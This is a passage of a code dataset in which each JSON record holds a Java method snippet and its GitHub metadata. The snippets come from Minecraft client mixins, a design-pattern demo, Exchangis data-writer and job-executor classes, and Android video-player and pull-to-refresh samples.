Mercury.INSTANCE.getEventManager().fireEvent(event);\n        if (event.isCancelled()) {\n            callbackInfo.cancel();\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityLivingBase.java", "stars": "12", "class_props": {"extends": null, "implements": ["Util"], "modifiers": ["public"]}}, {"id": 32960, "method_name": "jumpMotionX", "class_name": "MixinEntityLivingBase", "params": ["Entity"], "throws": null, "modifiers": ["private"], "return_type": "double", "snippet": "    private double jumpMotionX(Entity player) {\n        return location.getX();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityLivingBase.java", "stars": "12", "class_props": {"extends": null, "implements": ["Util"], "modifiers": ["public"]}}, {"id": 32961, "method_name": "jumpMotionY", "class_name": "MixinEntityLivingBase", "params": ["Entity"], "throws": null, "modifiers": ["private"], "return_type": "double", "snippet": "    private double jumpMotionY(Entity player) {\n        return location.getY();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityLivingBase.java", "stars": "12", "class_props": {"extends": null, "implements": ["Util"], "modifiers": ["public"]}}, {"id": 32962, "method_name": "jumpMotionZ", "class_name": "MixinEntityLivingBase", "params": ["Entity"], "throws": null, "modifiers": ["private"], "return_type": "double", "snippet": "    private double jumpMotionZ(Entity player) {\n        return location.getZ();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityLivingBase.java", "stars": "12", "class_props": {"extends": null, "implements": ["Util"], "modifiers": ["public"]}}, {"id": 32963, "method_name": "getLocation", "class_name": "MixinEntityLivingBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Location", "snippet": "    public Location getLocation() {\n        if (location == null)\n            location = new Location(mc.player.motionX, mc.player.motionY, mc.player.motionZ);\n        location.setX(mc.player.motionX);\n        location.setY(mc.player.motionY);\n        location.setZ(mc.player.motionZ);\n        return location;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityLivingBase.java", "stars": "12", "class_props": {"extends": null, "implements": ["Util"], "modifiers": ["public"]}}, {"id": 32964, "method_name": "main", "class_name": "CourseFactoryTest", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u76f8\u5f53\u4e8e\u5ba2\u6237\u7aef\uff0c\u6b64\u65f6\u65e0\u9700\u5173\u5fc3\u89c6\u9891\u3001\u7b14\u8bb0\u7b49\uff0c\u53ea\u9700\u8981\u5173\u5fc3\u4ece\u5bf9\u5e94\u5de5\u5382\u62ff\u5bf9\u5e94\u4ea7\u54c1\u5373\u53ef\n        //\u4ece\u540c\u4e00\u5de5\u5382\u62ff\u51fa\u6765\u7684\u4e1c\u897f\u5c5e\u4e8e\u540c\u4e00\u4ea7\u54c1\u65cf\n        JavaCourseFactory javaCourseFactory = new JavaCourseFactory();\n        Video javaVideo = javaCourseFactory.createVideo();\n        javaVideo.show();\n        Note javaNote = javaCourseFactory.createNote();\n        javaNote.show();\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/abstractfactory/CourseFactoryTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32965, "method_name": "produceUnstructuredWriter", "class_name": "TextCsvWriterManager", "params": ["String", "char", "Writer"], "throws": null, "modifiers": ["public", "static"], "return_type": "UnstructuredWriter", "snippet": "    public static UnstructuredWriter produceUnstructuredWriter(\n            String fileFormat, char fieldDelimiter, Writer writer) {\n        // warn: false means plain text(old way), true means strict csv format\n        if (Constant.FILE_FORMAT_TEXT.equals(fileFormat)) {\n            return new TextWriterImpl(writer, fieldDelimiter);\n        } else {\n            return new CsvWriterImpl(writer, fieldDelimiter);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/writer/TextCsvWriterManager.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32966, "method_name": "writeOneRecord", "class_name": "CsvWriterImpl", "params": ["List<String>"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeOneRecord(List<String> splitedRows) throws IOException {\n        if (splitedRows.isEmpty()) {\n            LOG.info(\"Found one record line which is empty.\");\n        }\n        this.csvWriter.writeRecord((String[]) splitedRows\n                .toArray(new String[0]));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/writer/TextCsvWriterManager.java", "stars": "23", "class_props": {"extends": null, "implements": ["UnstructuredWriter"], "modifiers": []}}, {"id": 32967, "method_name": "flush", "class_name": "CsvWriterImpl", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void flush() throws IOException {\n        this.csvWriter.flush();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/writer/TextCsvWriterManager.java", "stars": "23", "class_props": {"extends": null, "implements": ["UnstructuredWriter"], "modifiers": []}}, {"id": 32968, "method_name": "close", "class_name": "CsvWriterImpl", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void close() throws IOException {\n        this.csvWriter.close();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/writer/TextCsvWriterManager.java", "stars": "23", "class_props": {"extends": null, "implements": ["UnstructuredWriter"], "modifiers": []}}, {"id": 32969, "method_name": "writeOneRecord", "class_name": "TextWriterImpl", "params": ["List<String>"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeOneRecord(List<String> splitedRows) throws IOException {\n        if (splitedRows.isEmpty()) {\n            LOG.info(\"Found one record line which is empty.\");\n        }\n        this.textWriter.write(String.format(\"%s%s\",\n                StringUtils.join(splitedRows, this.fieldDelimiter),\n                IOUtils.LINE_SEPARATOR));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/writer/TextCsvWriterManager.java", "stars": "23", "class_props": {"extends": null, "implements": ["UnstructuredWriter"], "modifiers": []}}, {"id": 32970, "method_name": "flush", "class_name": "TextWriterImpl", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void flush() throws IOException {\n        this.textWriter.flush();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/writer/TextCsvWriterManager.java", "stars": "23", "class_props": {"extends": null, "implements": ["UnstructuredWriter"], "modifiers": []}}, {"id": 32971, "method_name": "close", "class_name": "TextWriterImpl", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void close() throws IOException {\n        this.textWriter.close();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/writer/TextCsvWriterManager.java", "stars": "23", "class_props": {"extends": null, "implements": ["UnstructuredWriter"], "modifiers": []}}, {"id": 32972, "method_name": "init", "class_name": "SampleCoverVideo", "params": ["Context"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void init(Context context) {\n        super.init(context);\n        mCoverImage = (ImageView) findViewById(R.id.thumbImage);\n\n        if (mThumbImageViewLayout != null &&\n                (mCurrentState == -1 || mCurrentState == CURRENT_STATE_NORMAL || mCurrentState == CURRENT_STATE_ERROR)) {\n            mThumbImageViewLayout.setVisibility(VISIBLE);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32973, "method_name": "getLayoutId", "class_name": "SampleCoverVideo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId() {\n        return R.layout.video_layout_cover;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32974, "method_name": "loadCoverImage", "class_name": "SampleCoverVideo", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void loadCoverImage(String url, int res) {\n        mCoverOriginUrl = url;\n        mDefaultRes = res;\n        Glide.with(getContext().getApplicationContext())\n                .setDefaultRequestOptions(\n                        new RequestOptions()\n                                .frame(1000000)\n                                .centerCrop()\n                                .error(res)\n                                .placeholder(res))\n                .load(url)\n                .into(mCoverImage);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32975, "method_name": "startWindowFullscreen", "class_name": "SampleCoverVideo", "params": ["Context", "boolean", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYBaseVideoPlayer", "snippet": "    public GSYBaseVideoPlayer startWindowFullscreen(Context context, boolean actionBar, boolean statusBar) {\n        GSYBaseVideoPlayer gsyBaseVideoPlayer = super.startWindowFullscreen(context, actionBar, statusBar);\n        SampleCoverVideo sampleCoverVideo = (SampleCoverVideo) gsyBaseVideoPlayer;\n        sampleCoverVideo.loadCoverImage(mCoverOriginUrl, mDefaultRes);\n        return gsyBaseVideoPlayer;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32976, "method_name": "showSmallVideo", "class_name": "SampleCoverVideo", "params": ["Point", "boolean", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYBaseVideoPlayer", "snippet": "    public GSYBaseVideoPlayer showSmallVideo(Point size, boolean actionBar, boolean statusBar) {\n        //\u4e0b\u9762\u8fd9\u91cc\u66ff\u6362\u6210\u4f60\u81ea\u5df1\u7684\u5f3a\u5236\u8f6c\u5316\n        SampleCoverVideo sampleCoverVideo = (SampleCoverVideo) super.showSmallVideo(size, actionBar, statusBar);\n        sampleCoverVideo.mStartButton.setVisibility(GONE);\n        sampleCoverVideo.mStartButton = null;\n        return sampleCoverVideo;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32977, "method_name": "cloneParams", "class_name": "SampleCoverVideo", "params": ["GSYBaseVideoPlayer", "GSYBaseVideoPlayer"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void cloneParams(GSYBaseVideoPlayer from, GSYBaseVideoPlayer to) {\n        super.cloneParams(from, to);\n        SampleCoverVideo sf = (SampleCoverVideo) from;\n        SampleCoverVideo st = (SampleCoverVideo) to;\n        st.mShowFullAnimation = sf.mShowFullAnimation;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32978, "method_name": "clearFullscreenLayout", "class_name": "SampleCoverVideo", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void clearFullscreenLayout() {\n        if (!mFullAnimEnd) {\n            return;\n        }\n        mIfCurrentIsFullscreen = false;\n        int delay = 0;\n        if (mOrientationUtils != null) {\n            delay = mOrientationUtils.backToProtVideo();\n            mOrientationUtils.setEnable(false);\n            if (mOrientationUtils != null) {\n                mOrientationUtils.releaseListener();\n                mOrientationUtils = null;\n            }\n        }\n\n        if (!mShowFullAnimation) {\n            delay = 0;\n        }\n\n        final ViewGroup vp = (CommonUtil.scanForActivity(getContext())).findViewById(Window.ID_ANDROID_CONTENT);\n        final View oldF = vp.findViewById(getFullId());\n        if (oldF != null) {\n            //\u6b64\u5904fix bug#265\uff0c\u63a8\u51fa\u5168\u5c4f\u7684\u65f6\u5019\uff0c\u865a\u62df\u6309\u952e\u95ee\u9898\n            SampleCoverVideo gsyVideoPlayer = (SampleCoverVideo) oldF;\n            gsyVideoPlayer.mIfCurrentIsFullscreen = false;\n        }\n\n        if (delay == 0) {\n            backToNormal();\n        } else {\n            postDelayed(new Runnable() {\n                @Override\n                public void run() {\n                    backToNormal();\n                }\n            }, delay);\n        }\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32979, "method_name": "onSurfaceUpdated", "class_name": "SampleCoverVideo", "params": ["Surface"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceUpdated(Surface surface) {\n        super.onSurfaceUpdated(surface);\n        if (mThumbImageViewLayout != null && mThumbImageViewLayout.getVisibility() == VISIBLE) {\n            mThumbImageViewLayout.setVisibility(INVISIBLE);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32980, "method_name": "setViewShowState", "class_name": "SampleCoverVideo", "params": ["View", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setViewShowState(View view, int visibility) {\n        if (view == mThumbImageViewLayout && visibility != VISIBLE) {\n            return;\n        }\n        super.setViewShowState(view, visibility);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32981, "method_name": "onSurfaceAvailable", "class_name": "SampleCoverVideo", "params": ["Surface"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceAvailable(Surface surface) {\n        super.onSurfaceAvailable(surface);\n        if (GSYVideoType.getRenderType() != GSYVideoType.TEXTURE) {\n            if (mThumbImageViewLayout != null && mThumbImageViewLayout.getVisibility() == VISIBLE) {\n                mThumbImageViewLayout.setVisibility(INVISIBLE);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32982, "method_name": "onClickUiToggle", "class_name": "SampleCoverVideo", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onClickUiToggle() {\n        if (mIfCurrentIsFullscreen && mLockCurScreen && mNeedLockFull) {\n            setViewShowState(mLockScreen, VISIBLE);\n            return;\n        }\n        byStartedClick = true;\n        super.onClickUiToggle();\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32983, "method_name": "changeUiToNormal", "class_name": "SampleCoverVideo", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void changeUiToNormal() {\n        super.changeUiToNormal();\n        byStartedClick = false;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32984, "method_name": "changeUiToPreparingShow", "class_name": "SampleCoverVideo", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void changeUiToPreparingShow() {\n        super.changeUiToPreparingShow();\n        Debuger.printfLog(\"Sample changeUiToPreparingShow\");\n        setViewShowState(mBottomContainer, INVISIBLE);\n        setViewShowState(mStartButton, INVISIBLE);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32985, "method_name": "changeUiToPlayingBufferingShow", "class_name": "SampleCoverVideo", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void changeUiToPlayingBufferingShow() {\n        super.changeUiToPlayingBufferingShow();\n        Debuger.printfLog(\"Sample changeUiToPlayingBufferingShow\");\n        if (!byStartedClick) {\n            setViewShowState(mBottomContainer, INVISIBLE);\n            setViewShowState(mStartButton, INVISIBLE);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32986, "method_name": "changeUiToPlayingShow", "class_name": "SampleCoverVideo", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void changeUiToPlayingShow() {\n        super.changeUiToPlayingShow();\n        Debuger.printfLog(\"Sample changeUiToPlayingShow\");\n        if (!byStartedClick) {\n            setViewShowState(mBottomContainer, INVISIBLE);\n            setViewShowState(mStartButton, INVISIBLE);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32987, "method_name": "startAfterPrepared", "class_name": "SampleCoverVideo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void startAfterPrepared() {\n        super.startAfterPrepared();\n        Debuger.printfLog(\"Sample startAfterPrepared\");\n        setViewShowState(mBottomContainer, INVISIBLE);\n        setViewShowState(mStartButton, INVISIBLE);\n        setViewShowState(mBottomProgressBar, VISIBLE);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32988, "method_name": "onStartTrackingTouch", "class_name": "SampleCoverVideo", "params": ["SeekBar"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStartTrackingTouch(SeekBar seekBar) {\n        byStartedClick = true;\n        super.onStartTrackingTouch(seekBar);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleCoverVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32989, "method_name": "onCreate", "class_name": "PullToRefreshListInViewPagerActivity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void onCreate(Bundle savedInstanceState) {\n\t\tsuper.onCreate(savedInstanceState);\n\t\tsetContentView(R.layout.activity_ptr_list_in_vp);\n\n\t\tmViewPager = (ViewPager) findViewById(R.id.vp_list);\n\t\tmViewPager.setAdapter(new ListViewPagerAdapter());\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/LauncherActivity/src/com/handmark/pulltorefresh/samples/PullToRefreshListInViewPagerActivity.java", "stars": "74", "class_props": {"extends": "Activity", "implements": ["OnRefreshListener"], "modifiers": ["public"]}}, {"id": 32990, "method_name": "onRefresh", "class_name": "PullToRefreshListInViewPagerActivity", "params": ["PullToRefreshBase<ListView>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onRefresh(PullToRefreshBase<ListView> refreshView) {\n\t\tnew GetDataTask(refreshView).execute();\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/LauncherActivity/src/com/handmark/pulltorefresh/samples/PullToRefreshListInViewPagerActivity.java", "stars": "74", "class_props": {"extends": "Activity", "implements": ["OnRefreshListener"], "modifiers": ["public"]}}, {"id": 32991, "method_name": "instantiateItem", "class_name": "ListViewPagerAdapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "\t\tpublic View instantiateItem(ViewGroup container, int position) {\n\t\t\tContext context = container.getContext();\n\n\t\t\tPullToRefreshListView plv = (PullToRefreshListView) LayoutInflater.from(context).inflate(\n\t\t\t\t\tR.layout.layout_listview_in_viewpager, container, false);\n\n\t\t\tListAdapter adapter = new ArrayAdapter<String>(context, android.R.layout.simple_list_item_1,\n\t\t\t\t\tArrays.asList(STRINGS));\n\t\t\tplv.setAdapter(adapter);\n\n\t\t\tplv.setOnRefreshListener(PullToRefreshListInViewPagerActivity.this);\n\n\t\t\t// Now just add ListView to ViewPager and return it\n\t\t\tcontainer.addView(plv, LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT);\n\n\t\t\treturn plv;\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/LauncherActivity/src/com/handmark/pulltorefresh/samples/PullToRefreshListInViewPagerActivity.java", "stars": "74", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["private"]}}, {"id": 32992, "method_name": "destroyItem", "class_name": "ListViewPagerAdapter", "params": ["ViewGroup", "int", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void destroyItem(ViewGroup container, int position, Object object) {\n\t\t\tcontainer.removeView((View) object);\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/LauncherActivity/src/com/handmark/pulltorefresh/samples/PullToRefreshListInViewPagerActivity.java", "stars": "74", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["private"]}}, {"id": 32993, "method_name": "isViewFromObject", "class_name": "ListViewPagerAdapter", "params": ["View", "Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean isViewFromObject(View view, Object object) {\n\t\t\treturn view == object;\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/LauncherActivity/src/com/handmark/pulltorefresh/samples/PullToRefreshListInViewPagerActivity.java", "stars": "74", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["private"]}}, {"id": 32994, "method_name": "getCount", "class_name": "ListViewPagerAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\tpublic int getCount() {\n\t\t\treturn 3;\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/LauncherActivity/src/com/handmark/pulltorefresh/samples/PullToRefreshListInViewPagerActivity.java", "stars": "74", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["private"]}}, {"id": 32995, "method_name": "doInBackground", "class_name": "GetDataTask", "params": ["Void"], "throws": null, "modifiers": ["protected"], "return_type": "Void", "snippet": "\t\tprotected Void doInBackground(Void... params) {\n\t\t\t// Simulates a background job.\n\t\t\ttry {\n\t\t\t\tThread.sleep(4000);\n\t\t\t} catch (InterruptedException e) {\n\t\t\t}\n\t\t\treturn null;\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/LauncherActivity/src/com/handmark/pulltorefresh/samples/PullToRefreshListInViewPagerActivity.java", "stars": "74", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32996, "method_name": "onPostExecute", "class_name": "GetDataTask", "params": ["Void"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\t\tprotected void onPostExecute(Void result) {\n\t\t\tmRefreshedView.onRefreshComplete();\n\t\t\tsuper.onPostExecute(result);\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/LauncherActivity/src/com/handmark/pulltorefresh/samples/PullToRefreshListInViewPagerActivity.java", "stars": "74", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32997, "method_name": "toStop", "class_name": "JobExecutor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void toStop() {\n        LOG.info(\"Stop task, info {}\", taskProcess);\n        try {\n            //first to destroy the process\n            taskProcess.destroy();\n            //second to clean it\n            status = ExecuteStatus.KILL;\n        } catch (Exception e) {\n            long taskId = TaskProcessUtils.getTaskId(taskProcess);\n            LOG.error(\"TASK_KILL_ERROR, kill task error, jobId: {} , taskId: {}, message: {}\",\n                    TaskProcessUtils.getJobId(taskProcess), taskId, e.getMessage(), e);\n            throw new RuntimeException(e);\n        }\n\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 32998, "method_name": "log", "class_name": "JobExecutor", "params": ["long", "long"], "throws": null, "modifiers": ["public"], "return_type": "LogResult", "snippet": "    public LogResult log(long startLine, long windSize){\n        return this.taskProcess.log(startLine, windSize);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 32999, "method_name": "getResource", "class_name": "JobExecutor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Resource", "snippet": "    public Resource getResource(){\n        return taskProcess.getResource();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33000, "method_name": "waitForAlloc", "class_name": "JobExecutor", "params": ["int", "TimeUnit"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean waitForAlloc(int interval, TimeUnit timeUnit){\n        alloc.lock();\n        try{\n            if(!TaskProcessUtils.isAllocate(taskProcess)){\n                if(notAlloc.await(interval, timeUnit)){\n                    //Do nothing\n                }\n            }\n        } catch (InterruptedException e) {\n            LOG.error(\"Interrupt when waiting for allocating resource for 'jobExecutor'\");\n            Thread.currentThread().interrupt();\n        } finally{\n            alloc.unlock();\n        }\n        return TaskProcessUtils.isAllocate(taskProcess);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33001, "method_name": "init", "class_name": "JobExecutor", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() throws Exception {\n        taskProcess.init();\n        init = true;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33002, "method_name": "clean", "class_name": "JobExecutor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clean(){\n        if(null != taskProcess) {\n            taskProcess.clean();\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33003, "method_name": "run", "class_name": "JobExecutor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n        status = ExecuteStatus.NONE;\n        String message = \"\";\n        long jobId = TaskProcessUtils.getJobId(taskProcess);\n        long taskId = TaskProcessUtils.getTaskId(taskProcess);\n        Exception ex = null;\n        try {\n            if(!init) {\n                taskProcess.init();\n            }\n            try {\n                Future<Integer> taskFuture = allocAndExec(taskProcess);\n                LOG.info(\"Task {} 's status change to RUNNING\", taskId);\n                status = ExecuteStatus.RUNNING;\n                int exitCode;\n  